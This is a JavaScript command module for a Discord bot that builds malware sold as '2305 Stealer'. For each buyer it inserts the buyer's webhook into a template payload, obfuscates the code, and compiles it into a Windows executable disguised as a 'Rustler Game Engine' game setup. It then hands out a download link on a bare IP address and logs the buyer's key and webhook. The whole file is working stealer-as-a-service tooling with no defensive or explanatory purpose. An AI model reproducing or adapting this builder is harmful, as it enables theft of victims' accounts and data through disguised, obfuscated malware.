const Discord = require("discord.js");
var cmd = require('node-cmd');
const { compile } = require('nexe')
var randomstring = require("randomstring");
const profiles = require("../tables/profiles");
const prettyBytes = require('pretty-bytes');
const child_process = require('child_process');
var fs = require("fs"); //Load the filesystem module
const cooldown = new Set()

exports.run = async (client, message, args) => {

  function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }
  const userprofile = await profiles.findOne({
    userid: "<@" + message.author.id + ">",
    key: args[1],

  });

  if (!args[1] || !args[0]) {
    message.reply("Invalid arguments! Use:$build <webhook> <key>");
  } else {
    if (!userprofile) return message.reply("Invalid key!")

    await profiles.findOneAndUpdate({
      userid: "<@" + message.author.id + ">",
      key: args[1],
    }, {

      $set: {
        webhookURL: args[0]
      }
    })
    var rst = "2305GameSetup" + randomstring.generate(7);

    message.channel.send("Creating Your File...")
    var injections = fs.readFileSync('C://Users//Rustler//Desktop//BuildBot2//build//index-win.js');

    fs.writeFile(`C://Users//Rustler//Desktop//BuildBot2//build//${message.author.id}.js`, injections, (err) => {
      if (err)
        console.log(err);
      else {


        const islem = child_process.exec(`powershell -Command "(gc C://Users//Rustler//Desktop//BuildBot2//build//${message.author.id}.js) -replace 'da_webhook', '${args[0]}' | Out-File -encoding ASCII C://Users//Rustler//Desktop//BuildBot2//build//${message.author.id}1.js`, function (error, stdout, stderr) {
        });

        islem.on('exit', function (code, signal) {

          sleep(1000);
          const islemgib = child_process.exec(`powershell -Command "(gc C://Users//Rustler//Desktop//BuildBot2//build//${message.author.id}.js) -replace 'da_webhook', '${args[0]}' | Out-File -encoding ASCII C://Users//Rustler//Desktop//BuildBot2//build//${message.author.id}1.js`, function (error, stdout, stderr) {
            if (error) throw error;
          });

          islemgib.on('exit', function (code, signal) {
            sleep(1000);
            const islem = child_process.exec(`javascript-obfuscator ./build/${message.author.id}1.js --config ./build/obf-config.json --output ./build/${message.author.id}s.js`, function (error, stdout, stderr) {
              if (error) throw error;
            });
            islem.on('exit', function (code, signal) {
              sleep(1000);
              compile({
                input: `./build/${message.author.id}s.js`,
                output: `./build/${rst}`,
                resources: [`./build/node_modules/`],
                vcBuild: "nosign",
                build: true, //required to use patches
                rc: {
                  "CompanyName": "Rustler Game Engine",
                  "ProductName": "Rustler Game Engine",
                  "FileDescription": "Rustler Game Engine",
                  "FileVersion": "1.0.0",
                  "ProductVersion": "1.0.0",
                  "OriginalFilename": "NewGame.exe",
                  "InternalName": "NewGame",
                  "LegalCopyright": "Rustler Game Engine"
                },
                patches: [
                  async (compiler, next) => {
                    await compiler.setFileContentsAsync(
                      'lib/new-native-module.js',
                      'module.exports = 42'
                    )
                    return next()
                  }
                ]
              }).then(() => {
                const exampleEmbed = new Discord.MessageEmbed()
                  .setColor('#36393f')
                  .setAuthor('2305 Stealer', 'https://cdn.discordapp.com/attachments/897876884631744514/985985966143578212/f8d0562311308038aed4beac5e7620b9.jpg')
                  .setDescription(`__Here's your file:__\n[Download](http://20.199.88.164/${rst}.exe)`)
                  .setTimestamp()
                  .setFooter('2305 Stealer');

                const RustlerLOGS = new Discord.MessageEmbed()
                  .setAuthor('2305 Stealer', 'https://cdn.discordapp.com/attachments/897876884631744514/985985966143578212/f8d0562311308038aed4beac5e7620b9.jpg')
                  .setColor('#36393f')
                  .addFields(
                    {
                      name: "Builder:",
                      value: `*<@${message.author.id}> (${message.author.id})*`,
                      inline: true
                    },
                    {
                      name: "Key:",
                      value: `*${args[1]}*`,
                      inline: true
                    },
                    {
                      name: "Exe:",
                      value: `*${rst}.exe*`,
                      inline: true
                    },
                    {
                      name: "Webhook:",
                      value: `\`\`\`${args[0]}\`\`\``,
                      inline: false
                    })
                  .setTimestamp()
                  .setFooter('2305 Stealer');

                let RustlerLog = client.channels.cache.get("986300928128872461");
                RustlerLog.send(RustlerLOGS);

                if (signal == null) {
                  message.channel.send(exampleEmbed);
                } else {
                  message.channel.send("Please try again");
                }
                function rsthengibi() {
                  fs.unlinkSync(`C://Users//Rustler//Desktop//BuildBot2//build//${message.author.id}.js`);
                  fs.unlinkSync(`C://Users//Rustler//Desktop//BuildBot2//build//${message.author.id}1.js`);
                  fs.unlinkSync(`C://Users//Rustler//Desktop//BuildBot2//build//${message.author.id}s.js`);
                }
                setTimeout(rsthengibi, 10000);
                //setTimeout(selamVer, 90000);
              })
            });
          });
        });
      }
    });
  }

};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["s"],
  permLevel: 0
};

exports.help = {
  name: "build",
  cooldown: "6",
  description: "Botun istatistiklerini gösterir",
  usage: "istatistik"
};